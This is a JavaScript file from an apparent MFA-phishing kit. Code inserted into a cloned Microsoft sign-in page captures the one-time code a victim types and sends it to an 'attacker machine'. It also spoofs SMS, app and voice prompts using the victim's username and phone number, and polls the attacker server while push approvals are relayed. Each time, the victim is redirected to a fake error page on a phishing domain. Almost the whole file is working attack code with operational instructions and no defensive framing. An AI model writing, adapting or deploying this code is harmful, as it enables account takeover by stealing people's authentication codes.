/*
collect_mfa.js - JavaScript used to collect multi-factor authentication token from user
                 and send them to a fake error page

Pro-tip:
In $(document).ready(function(){}) you will want to update Constants.DEFAULT_ILLUSTRATION to point
to your branded page. A proper clone may take care of this for you.
*/

/*** JS 1 of 2: Define this function right after $Config near the top of the page.
    Update the sign-in button to call our function:
        <span tabindex="0" class="button normaltext cred_sign_in_button no_display"
        id="tfa_signin_button" onclick="javascript:doMFAAuth();" role="button" >Sign in</span>
**/
function doMFAAuth() {
    url='https://portal.widgetscorp.co/'; // point to attacker machine hosting mfa_slipstream
    mfa_code = encodeURIComponent(document.getElementById('tfa_code_inputtext').value);

    var httpXHR = new XMLHttpRequest();
        httpXHR.open("GET",url+"domfa?code="+mfa_code, true);
        httpXHR.onreadystatechange = function() {
            if (httpXHR.readyState ==4) {
                var response = httpXHR.responseText;
                window.location.replace("https://login.mymicrosoftphish.com/error?cca69193-48b7-4854-87bb-968ac6251799/oauth2/authorize&client_id=00000003-0000-0aa2-hf00-000000000000&response_mode=form_post&response_type=code&id_token&scope=openid&nonce=4BA4CBC3CBCEB81924");
            } //else {
                //document.getElementById('ajax_results').innerHTML = httpXHR.readyState + " " + httpXHR.responseText;
            //}
        }
        httpXHR.send();
}


/*** JS 2 of 2: After the if statement that calls TenantBranding.AddBoilerPlateText, add this Parsing code ***/
// Parse
var query = window.location.search.substring(1);
var vars = query.split("&");
console.log(vars);
var fill_username = "";
var fill_phone = "";
var auth_method = "";
for (var i=0;i<vars.length;i++) {
    var pair = vars[i].split("=");
    if (pair[0]=="username") {
        // alert("username:"+decodeURIComponent(pair[1]));
        fill_username = decodeURIComponent(pair[1]);
    } else if (pair[0]=="l2phone") {
        // alert("phone:"+decodeURIComponent(pair[1]));
        fill_phone = decodeURIComponent(pair[1]);
    } else if (pair[0]=="auth") {
        auth_method = decodeURIComponent(pair[1]);
    }
}

if (fill_username==""){
    fill_username = "widgetscorp.com";
}
if (fill_phone==""){
    fill_phone = "XX";
}

if (auth_method==""){
    auth_method="OneWaySMS"; // Default
} else if (auth_method=="0") {
    auth_method="OneWaySMS";
} else if (auth_method=="1") {
    auth_method="PhoneAppNotification";
} else if (auth_method=="2") {
    auth_method="PhoneAppOTP";
} else if (auth_method=="3") {
    auth_method="TwoWayVoiceMobile";
    //office phone auth method unknown - same?
} else {
    auth_method="OneWaySMS"; //Default
}

// Based on authentication type, fill the user prompt
if (auth_method=="OneWaySMS") {
    document.getElementById("title1_").innerHTML = fill_username;
    document.getElementById("title2_").innerHTML = "Text me at +X XXXXXXXX"+fill_phone;
    var lower_element = document.getElementById('mfa_lower_0');
    lower_element.setAttribute("aria-hidden",false);
    lower_element.style.display = "block";
    showSignInButton = true;
} else if (auth_method=="PhoneAppNotification") {
    document.getElementById("title1_").innerHTML = fill_username;
    document.getElementById("title2_").innerHTML = "Use mobile app to verify my account";
    document.getElementById('tfa_signin_button').classList.add('no_display'); //hides sign in button
    var lower_element = document.getElementById('mfa_lower_1');
    lower_element.setAttribute("aria-hidden",false);
    lower_element.style.display = "block";
    showSignInButton = false;
} else if (auth_method=="PhoneAppOTP") {
    document.getElementById("title1_").innerHTML = fill_username;
    document.getElementById("title2_").innerHTML = "Use verification code from my mobile app";
    var lower_element = document.getElementById('mfa_lower_2');
    lower_element.setAttribute("aria-hidden",false);
    lower_element.style.display = "block";
    document.getElementById("tfa_signin_button");
    showSignInButton = true;
} else if (auth_method=="TwoWayVoiceMobile") {
    document.getElementById("title1_").innerHTML = fill_username;
    document.getElementById("title2_").innerHTML = "Call me at +X XXXXXXXX"+fill_phone;
    document.getElementById('tfa_signin_button').classList.add('no_display'); //hides sign in button
    var lower_element = document.getElementById('mfa_lower_3');
    lower_element.setAttribute("aria-hidden",false);
    lower_element.style.display = "block";
    showSignInButton = false;
} else {
    // We should never get here, but just in case default to SMS
    document.getElementById("title1_").innerHTML = fill_username;
    document.getElementById("title2_").innerHTML = "Text me at +X XXXXXXXX"+fill_phone;
    var lower_element = document.getElementById('mfa_lower_0');
    lower_element.setAttribute("aria-hidden",false);
    lower_element.style.display = "block";
    showSignInButton = true;
}

if(showSignInButton) {
    //Let's delay showing the MFA login prompt a little while
    $("#tfa_code_inputtext").delay(3000).show(0);
    $("#tfa_signin_button").delay(3000).show(0);
} else {
    // If we don't show a sign in button, set up comms to MFA Slipstream to let us know when to proceed
    var waitForMFASApprove = function () {
        url = 'https://portal.widgetscorp.com/checkload' // point to attacker machine hosting mfa_slipstream
        var httpXHR = new XMLHttpRequest();
        httpXHR.open("GET",url, true);
        httpXHR.onreadystatechange = function() {
            //ref: readyState 0=unsent,1=opened,2=headersrecieved,3=loading,4=done
            if (httpXHR.readyState == 4 ) {
                var response = httpXHR.responseText;
                // console.log('RESPONSE FROM XHR: '+response);
                if (response=="1") {
                    // This should point to the error page where to dump the user off to
                    window.location.replace("https://login.mymicrosoftphish.com/error?cca69193-48b7-4854-87bb-968ac6251799/oauth2/authorize&client_id=00000005-0000-0aa2-hf00-000000000000&response_mode=form_post&response_type=code&id_token&scope=openid&nonce=4BA4CBC3CBCEB81924");
                }
            }
        }
        httpXHR.send();
    };
    setInterval(waitForMFASApprove, 1000);
}

